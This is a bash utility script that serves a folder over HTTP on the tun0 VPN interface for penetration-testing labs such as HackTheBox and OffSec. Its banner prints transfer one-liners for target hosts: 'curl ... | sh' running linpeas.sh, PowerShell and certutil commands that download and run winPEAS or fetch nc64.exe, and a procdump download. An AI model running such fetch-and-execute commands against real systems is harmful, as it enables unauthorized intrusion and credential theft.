#!/usr/bin/env bash
# HTB / THM / OffSec / HS Drop Server — neoserv
# Author: Chris Alupului (Neospring)
# Serves the repo folder on tun0:80 (override port: neoserv 1337).

# Resolve the script's real directory (follows symlinks like ~/.local/bin/neoserv).
ROOT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
PORT="${1:-80}"

# Privileged ports (<1024) need root. Re-exec with sudo if necessary.
# Use the resolved absolute path so sudo's restricted secure_path doesn't break us
# when invoked via the ~/.local/bin/neoserv symlink.
if [ "$PORT" -lt 1024 ] && [ "$EUID" -ne 0 ]; then
  echo "[*] Port $PORT requires root. Re-running with sudo..."
  exec sudo -E "$(readlink -f "$0")" "$PORT"
fi

ip=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
if [ -z "$ip" ]; then
  echo "[!] tun0 not up. Connect to your lab VPN first (HTB / THM / OffSec / HS)."
  exit 1
fi

# Build a clean URL prefix: omit ":80" since 80 is the HTTP default.
if [ "$PORT" = "80" ]; then
  URL="http://$ip"
else
  URL="http://$ip:$PORT"
fi

cat <<EOF
   _  _ ___ ___  ___ ___ _____   __
  | \| | __/ _ \/ __| __| _ \ \ / /
  | .\` | _| (_) \__ \ _||   /\ V /
  |_|\_|___\___/|___/___|_|_\ \_/
   HTB / THM / OffSec / HS Drop Server — by Chris Alupului (Neospring)

[*] serving $ROOT
[*] $URL/   (flat URLs work, e.g. $URL/linpeas.sh)

  Linux:    curl $URL/linpeas.sh | sh
  PS:       iwr $URL/winPEASx64.exe -o w.exe; .\\w.exe
  certutil: certutil -urlcache -f $URL/nc64.exe nc.exe
  wget:     wget $URL/procdump64.exe

[*] Ctrl-C to stop.
EOF

cd "$ROOT" || exit 1

echo "[*] Available files:"
echo "==================================================="
if command -v eza >/dev/null 2>&1; then
  eza -R --icons=always --color=always --group-directories-first
else
  ls -R --color=always
fi
echo "==================================================="
echo

if command -v php >/dev/null 2>&1; then
  # router.php = flat-URL routing (basename lookup across subdirs).
  # -d opcache.jit=off silences the harmless "JIT disabled" warning emitted
  # when Xdebug (or another extension hooking zend_execute_ex) is loaded.
  exec php -d opcache.jit=off -d opcache.jit_buffer_size=0 -S "$ip:$PORT" router.php
else
  echo "[!] php is required for flat-URL routing; falling back to plain python3 (subdir paths only)."
  exec python3 -m http.server "$PORT" --bind "$ip"
fi
